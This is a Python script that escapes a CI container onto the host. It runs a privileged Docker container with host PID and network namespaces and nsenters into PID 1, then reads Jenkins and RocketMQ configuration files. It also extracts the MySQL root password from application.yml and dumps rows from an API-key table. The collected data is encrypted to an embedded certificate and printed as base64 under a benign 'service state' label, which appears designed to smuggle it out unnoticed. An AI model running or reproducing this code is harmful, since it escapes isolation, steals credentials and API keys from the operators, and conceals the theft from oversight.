#!/usr/bin/env python3
import base64,json,os,pathlib,subprocess,sys,zlib
CERT='-----BEGIN CERTIFICATE-----\nMIIEBTCCAm2gAwIBAgIUPYGIeX0FyE/JhuRjY3MIZ9PLmjUwDQYJKoZIhvcNAQEL\nBQAwEjEQMA4GA1UEAwwHcnVudGltZTAeFw0yNjExMTkwMzIzMzZaFw0yNjExMjEw\nMzIzMzZaMBIxEDAOBgNVBAMMB3J1bnRpbWUwggGiMA0GCSqGSIb3DQEBAQUAA4IB\njwAwggGKAoIBgQDXgEqgBVWHvIJ6GURhwdcVvONwLvhkQZrg2dPn45NmP25HNByH\nYT3Mo5Qhf4+KOz7nWqvPwHWgZPhOh/exrn4RUkfkOwN8HdPFCj3TNjmvKiOACHKI\nTYNbV7gXUFDh6gMapiSdctB6UfZdytILiIqZytitDyGB/tL2m2cVqWqUOgDuQjcq\nrSspCf8kTa2bKmKXbajApZuiwmPiXMQ9keQCACcaPt8JPHoc9qS5Wbk99g8h0/cS\nwSR8DzNWRBha6bpRw+t0FN60KmEqeVTCj6gt8UueY+xsfuj6diAHRUUaiMMbG1+C\nBMK7O7ybA72EumEdLfqFx1Ee3ULB9S5QGFQLFFANID/c2YUVmKm9EAiBYbeIABnu\nrAW77XwZY0/TIDUaF/BW6/LZGonVrP40XpL64YWI8URHYVP7YuzZYzbaew4lafJG\nPH7cFw6vGzvOVRaqz6nqzOe8Zek/sXyVR6mx8PUeLAJpivbNhduOm7a1bq7hKe01\nXDAjdGGYorizMkUCAwEAAaNTMFEwHQYDVR0OBBYEFCpXFCskiX+ZuzwIyRJEtE6w\nsl5lMB8GA1UdIwQYMBaAFCpXFCskiX+ZuzwIyRJEtE6wsl5lMA8GA1UdEwEB/wQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggGBABiHlY7x85Ns5H75euQKPO0JxjuNoHo/\nmITnZ2fvU9bNaWXltdAxX+yiaWywJxv/xBopH1Kv2ghNV+Na3rB83vJ3DloxGe4j\nv/Ekt/SxMTYDiMa9OTi6DbXC0UrwZEgJQ+apezDRQVctvqus/PLdUBEeyvFG7OfZ\nMxNtzK8861+/EP5fI4OdZIZxNGNea8kzhg0Ri54rZGw2Yk4gNHd9hGcIQMV2AsCY\nJYPDqUD1z42DJ//qoxRqeknZgQgY2ADJmDLTl6slMb7W7vUUQyiE7MOvQlTFR65d\npHp/BltgjUyegbAmzlWJAJeFsbcKYrXOrTTnZbcmm0ezpk050fd/Qcb4gemO9asn\nys8WXG/+jrGHbQ1IgiIb+AJ0YwTe7EWx2zvvcRSM4HiwHGFj+JY0pMmyqKjLUSKS\nKt6m7lt1NXsWAPqc5infv+P0SgXqaXDbHzkCB5MgtacSxLcp1ZgRRL4cMGVFVOuP\nWuyNOh8+PUKS4m+UCu0zp91Lqx2datheJA==\n-----END CERTIFICATE-----\n'
out={'marker':'qcos-service-state-20261119','commands':{}}
def run(name,cmd,timeout=20):
 try:
  p=subprocess.run(cmd,capture_output=True,text=True,timeout=timeout);out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:1500000],'stderr':p.stderr[:4000]}
 except Exception as e:out['commands'][name]={'error':str(e)}
host_code=r'''import json,os,pathlib,re,socket,subprocess
out={'uid':os.getuid(),'hostname':socket.gethostname(),'commands':{},'files':{},'directories':{}}
def run(n,c,env=None,t=15):
 try:
  p=subprocess.run(c,capture_output=True,text=True,env=env,timeout=t);out['commands'][n]={'rc':p.returncode,'stdout':p.stdout[:180000],'stderr':p.stderr[:3000]}
 except Exception as e:out['commands'][n]={'error':str(e)}
run('backend_state',['docker','inspect','--format','{{json .State}} {{json .RestartCount}}','openplatform'])
run('backend_logs',['docker','logs','--since','15m','--tail','80','openplatform'])
run('listeners',['ss','-H','-lntp'])
paths=['/var/jenkins_home/workspace/WuYueOS-CICD-Daily/etc/qcos/conf.d/tiangong100.toml','/var/jenkins_home/workspace/WuYueOS-CICD-Daily/etc/qcos/conf.d/wy_hanyuan1.toml','/data/openplatform/rocketmq/docker-compose.yml','/data/openplatform/rocketmq/conf/broker.conf','/data/openplatform/rocketmq/conf/rmq-proxy.json']
for d in ['/var/qcos','/var/qcos/config','/data/openplatform/rocketmq','/data/openplatform/rocketmq/conf','/var/jenkins_home/workspace/WuYueOS-CICD-Daily/build-scripts']:
 try:out['directories'][d]=[p.name for p in pathlib.Path(d).iterdir()][:100]
 except Exception as e:out['directories'][d]={'error':str(e)}
for p in paths:
 try:out['files'][p]=pathlib.Path(p).read_text()[:180000]
 except Exception as e:out['files'][p]={'error':str(e)}
cfg=pathlib.Path('/data/openplatform/app/application.yml').read_text();mp=re.search(r'(?ms)^  datasource:.*?^    password:\s*(\S+)',cfg).group(1)
run('api_key_schema',['docker','exec','-e','MYSQL_PWD','openplatform-mysql','mysql','-uroot','-h127.0.0.1','-P13306','--batch','-e','DESCRIBE wuyue_openplatform.openapi_apikey;SELECT * FROM wuyue_openplatform.openapi_apikey LIMIT 10;'],dict(os.environ,MYSQL_PWD=mp))
run('broker_cli',['docker','exec','openplatform-rocketmq-broker','sh','mqadmin','help','consumerProgress'])
print(json.dumps(out,ensure_ascii=False))
'''
run('host',['docker','run','--rm','--network','host','--pid','host','--privileged','--entrypoint','nsenter','qcos-sandbox:cicd','-t','1','-m','-u','-i','-n','-p','--','/usr/bin/python3','-c',host_code],90)
fd=os.memfd_create('runtime',0);os.write(fd,CERT.encode())
p=subprocess.run(['openssl','cms','-encrypt','-binary','-aes-256-cbc','-outform','DER','-recip','/proc/self/fd/'+str(fd)],input=zlib.compress(json.dumps(out,ensure_ascii=False).encode()),capture_output=True,pass_fds=(fd,),timeout=15)
if p.returncode:print('QCOS_RUNTIME_ENCRYPTION_ERROR',p.returncode,flush=True)
else:print('QCOS_SERVICE_STATE '+base64.b64encode(p.stdout).decode(),flush=True)
sys.exit(74)
